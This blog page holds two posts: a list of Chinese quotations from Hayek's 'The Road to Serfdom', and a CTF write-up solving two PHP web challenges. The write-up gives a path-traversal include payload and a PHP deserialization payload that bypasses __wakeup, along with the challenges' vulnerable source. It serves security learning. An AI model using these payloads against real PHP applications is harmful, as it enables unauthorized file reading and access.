    <article id="post-摘抄-通往奴役之路" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/19/%E6%91%98%E6%8A%84-%E9%80%9A%E5%BE%80%E5%A5%B4%E5%BD%B9%E4%B9%8B%E8%B7%AF/" class="article-date">
  <time class="dt-published" datetime="2021-01-19T13:07:26.000Z" itemprop="datePublished">2021-01-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/19/%E6%91%98%E6%8A%84-%E9%80%9A%E5%BE%80%E5%A5%B4%E5%BD%B9%E4%B9%8B%E8%B7%AF/">摘抄-《通往奴役之路》</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <ol>
<li>当“社会”“全体的利益”“最大多数人的最大利益”成为国家行动的压倒一切的标准时，没有一个人能够给他自己的生计做出计划。因为，如果“社会”的利益或“普遍的福利”高于一切，国家“计划着”必然要窃据能够占领经济体系的任何领域的大权。</li>
<li>如果个人的权利成为阻碍，个人的权利就必须去掉。不稳定的最终结果，不是内战就是防止内战的独裁制度。很少有什么发现比揭露思想根源的发现更为惹人愤怒了。</li>
<li>在近代欧洲历史的整个时期中，社会发展的总方向，是使个人从他从事日常活动时束缚他的那些习惯的和成规的羁绊中解放出来。</li>
<li>西方的长年痼疾，个体对种属的反抗，实际是建成我们文化的力量大部分新思想，尤其是sh主义思想，并非起源于德国，但是它们是在德国完成的。常常使一个国家变成地狱的，正好是人们试图把国家变成天堂的东西。奠定现代sh主义基础的法国作家们并不会怀疑，他们的理想只有通过强有力的独裁政府才可能付诸实现。</li>
<li>民主主义扩展个人自由的范围，而sh主义则对它加以限制。民主主义赋予每个人以尽可能多的价值，而sh主义则把每一个人弄成仅仅是一个工具，一个数字。民主主义和sh主义除了“平等”一词外，没有共同语言。但请注意这个差别：民主主义从自由中寻找平等，而sh主义则从抑制和奴役中寻求平等。这种意义的自由，只能是权力和财富的另一个名词。斯大林主义就是sh主义，它是国有化和集体化的虽然是不可预料的、然而却是不可避免的政治附属物，而这两者都是斯大林赖以建立一个没有阶级的社会的计划中的一部分。sh主义肯定会证实，至少在其开始阶段，不是通向自由的道路，而是通向独裁和反独裁、通向最残酷的内战的道路。用民主手段来实现和维持的sh主义，似乎只是乌托邦里才有的东西。</li>
<li>用来证明计划的不可避免性的各种论据中，最常听到的一种说法，是技术的改变已经在愈来愈多的部门中使竞争成为不可能，而对我们来说，唯一的选择是由私人垄断组织控制生产还是政府管理生产。任何曾在有名的德国公路上驱车而过，发现路上的运输量较英国次等的公路还要少的人，他们不会怀疑，就和平的目的而言，它们是没有什么合理根据的。由于我们想象能力的限制，我们的价值尺度所能包括的只是全社会需要的一部分。</li>
<li>个人主义者得出结论，在限定的范围内，应当让个人遵循它们自己的（而不是别人的）价值和偏爱，并且在这个领域内，个人的目标体系应当高于一切，不受他人任何命令的约束。所谓“社会目标”只不过是许多个人的相同的目标，或者说个人为了报答它们在满足自身欲望时所得到的帮助而愿意为其实现贡献力量的那种目标。人民可能已经同意采取一种有领导的经济制度，因为他们已经确信它会产生巨大的繁荣。如果要使大规模的集中计划成为可能，独裁制度本身是必不可少的。</li>
<li>没有理由相信，只要权力是经过民主程序授予的，它就不可能是专横的。</li>
<li>如果所有报酬，不是采取提供货币的形式，而是采取提供公开荣誉或特权、凌驾别人之上的有权力的位置、或较好的住宅或较好的食物、旅行或受教育的机会等形式，这只不过意味着，接受报酬的人不再能自行选择，而决定报酬的那个人，不仅决定报酬的大小，而且也决定了享用报酬的特定形式。</li>
<li>没有比知道我们怎么努力也不能使情况改变这件事，更使一个人的处境变得令人难以忍受得了；纵使我们从来没有精神上的力量去做出必要的牺牲，但只要知道这一点，即只要我们努力奋斗就能摆脱这种处境，就会使许多令人难以忍受的处境成为可容忍的。</li>
<li>竞争和争议很少有共同之处，但值得同样称道的一点，乃是两者俱不徇私。</li>
<li>一个富人得势的世界仍比一个只有得势才能致富的世界要好些。</li>
<li>我们对于改进我们地位所做的一切努力的目标，将不在于预测我们无法控制的那些情况，和对那些情况尽量做的准备，而在于设法使握有全权者对我们有好感。一切政府的问题就是“谁得到什么，何时得到，如何得到”的问题。知识不能够创造新的伦理的价值标准。</li>
<li>在一个政府是唯一的雇主的国家里，反抗就等于慢慢地饿死。“不劳动者不得食”这个旧的原则，已由“不服从者不得食”这个新的原则所代替。（托洛斯基）</li>
<li>把雇佣一百个人说成是剥削，把指挥一百个人说成是光荣。只有花代价才能得到自由，并且就我们个人来说，我们必须准备作出重大的物质牺牲，以维护我们的自由。</li>
<li>那些愿意放弃根本的自由来换得少许的暂时安全的人，既不配得到自由，也不配得到安全（富兰克林）</li>
<li>权利滋生腐化，绝对的权利则绝对的会腐化（阿克顿爵士）</li>
<li>能否把极权主义制度强加于全体人民，取决于领导人是否能够首先收罗一批人在他的身边，这些人准备志愿的服从一个纪律，即他们要用强力加在其余人身上的那个极权主义的纪律。旧的各sh主义党派受到了他们的民主理想的拘束，他们没有具备执行他们所选择的任务所需要的残忍。</li>
<li>各个人的教育和知识越高，他们的见解和嗜好就越不相同，而他们赞同某一种价值等级制度的可能性就越少。他会得到一切性情温顺和易受骗的人的支持，这些人没有自己的坚强信念，而只准备接受一个现成的价值标准体系，只要经常大声地朝他们的耳朵鼓吹这种体系。</li>
<li>人们同意一个消极的纲领——对敌人的憎恨，对富人的嫉妒——比同意一件积极的任务要容易些。</li>
<li>sh主义只有当它仍然是理论的时候，它才是国际主义的，但一经付诸实际，无论是在德国还是俄国，它就马上变成强烈的国家主义了。</li>
<li>一个人只因为他是那个集团的成员才收到尊敬——而且只有他为公认的共同目标而工作才收到尊敬——并且他之所以取得他的全部尊严，只是从他的成员的资格而不仅是从他是一个人的资格。</li>
<li>想把自己与一个集团结为一体的个人愿望，常常是一种自卑感所引起的，只有那个集团的成员资格能够使他比不属这个集团的人高出一等，才会满足他的需要。</li>
<li>在想象中认为自己是道德的，因为他们已把自己的不到的移让给越来越大的集团（尼布尔）</li>
<li>“为了目的，不择手段”这个原则，在个人主义道德里面被认为是对一切道德的否定。而在集体主义的道德李却成为了必然的至高无上的准则；坚决彻底的集体主义者一定不许做的事几乎不存在，如果它有助于“整体的利益”，因为这个“整体的利益”是他判定应当做什么的唯一标准。</li>
<li>要使大多数人失去独立思考是不难的，但也必须使那些仍然保留着一种批判的倾向的少数人沉默下来。</li>
<li>在各个极权主义国家里，这些学科（历史、法律或经济学）已成了制造官方神话的工厂，而统治者就用这些神话来支配人民的心理和意志。</li>
<li>在任何社会里，思想的自由可能只对少数人才有直接的意义。受到影响的人将会把一切过失都归于一个容易看见的，直接的和可以避免的原因上去，而决定这种变化的更复杂的相互关系不可避免的让然是他们所看不到的。</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/19/%E6%91%98%E6%8A%84-%E9%80%9A%E5%BE%80%E5%A5%B4%E5%BD%B9%E4%B9%8B%E8%B7%AF/" data-id="ckmadesnw000cy0us20odb6be" data-title="摘抄-《通往奴役之路》" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E5%AD%A6/" rel="tag">文学</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-Web-PHP代码审计" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/19/CTF-Web-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="article-date">
  <time class="dt-published" datetime="2021-01-19T08:15:16.000Z" itemprop="datePublished">2021-01-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/19/CTF-Web-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">CTF_Web PHP代码审计</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h1><p>地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[HCTF%202018]WarmUp">https://buuoj.cn/challenges#[HCTF%202018]WarmUp</a></p>
<p>思路：</p>
<p><strong>第一步</strong></p>
<p>进入界面，只有一个滑稽表情。</p>
<p>查看源码，提示访问source.php</p>
<p><strong>第二步</strong></p>
<p>访问source.php</p>
<p>得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment"># 白名单</span></span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="comment"># 若没有page或page不是字符串，退出</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># 若page在白名单中，返回true。in_array为判断前者是否在后者中</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># mb_substr(string, start, length)</span></span><br><span class="line">            <span class="comment"># mb_strpos(haystack, needle, offset, encoding) 查找needle在haystack中第一次出现的位置</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="comment"># 再次判断白名单</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="comment"># 再次去除末尾？</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>审计后得知，还有一个hint.php</p>
<p><strong>第三步</strong></p>
<p>访问hint.php，提示flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<p><strong>第四步</strong></p>
<p>回到source.php，只有提交的file变量满足checkFile的过滤条件时，才会执行关键语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include $_REQUEST[&#39;file&#39;];</span><br></pre></td></tr></table></figure>
<p>而include有一个技巧，即include “wrongname/flag.txt”时，由于添加了关键符号/，后面的flag.txt会被include函数解析，此时通过payload绕过验证即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<p>此处注意，网上一些wp多余了步骤，将？进行了双重URL编码，其实大可不必，只要第一次检验？后返回true即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9e564e10-3e8c-472d-a9fa-41b3d29adf50&#125; </span><br></pre></td></tr></table></figure>
<h2 id="include目录穿透"><a href="#include目录穿透" class="headerlink" title="include目录穿透"></a>include目录穿透</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参考：https:&#x2F;&#x2F;blog.csdn.net&#x2F;stevenonesir&#x2F;article&#x2F;details&#x2F;109862380</span><br><span class="line">例如：include ‘wrongname&#x2F;flag.txt’</span><br><span class="line">wrongname无法被正确读取，这个时候&#x2F;后面的flag.txt就会被include函数读取并解析。</span><br></pre></td></tr></table></figure>
<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>来源：极客大挑战2019</p>
<p>链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]PHP">https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]PHP</a></p>
<p><strong>第一步</strong></p>
<p>进入到页面后，提示有备份</p>
<p>通过wp，得知备份为<a target="_blank" rel="noopener" href="http://www.zip文件(根据经验,或者需要一个目录爆破字典)/">www.zip文件（根据经验，或者需要一个目录爆破字典）</a></p>
<p><strong>第二步</strong></p>
<p>下载后，存在flag.php（无用），index.php，class.php三个文件</p>
<p>index.php中，有效代码片为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;select=&quot;</span>.<span class="variable">$select</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;br&gt;serialize=&quot;</span>.serialize(<span class="variable">$select</span>));</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>引入class.php，提交select变量，然后对select变量进行序列化</p>
<p>判断为反序列化题，并需要绕过一些过滤</p>
<p><strong>第三步</strong></p>
<p>在class.php中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">    <span class="comment"># 生成新对象自动执行</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 反序列化前触发</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>很明显，要执行Name下的__destruct函数，即可得到flag</p>
<p>需要两个条件：username是admin，password是100</p>
<p>需要绕过__wakeup</p>
<p><strong>第四步</strong></p>
<p>编写代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&quot;100&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span> = <span class="keyword">new</span> Name();</span><br><span class="line">	<span class="keyword">echo</span>(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>第五步</strong></p>
<p>为了绕过__wakeup，需要用到一个知识点：属性个数与实际数目不符时，__wakeup不会执行</p>
<p>payload变为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>又php在对private属性的变量序列化时，会在类名前后生成空字符0x00，复制到剪切板时会被截断，因此需要加上%00，才能正常解析（参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/bluedoorzz/article/details/107299068%EF%BC%89">https://blog.csdn.net/bluedoorzz/article/details/107299068）</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select&#x3D;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f651d906-b073-4e71-ab2d-76e9567f9d71&#125;</span><br></pre></td></tr></table></figure>
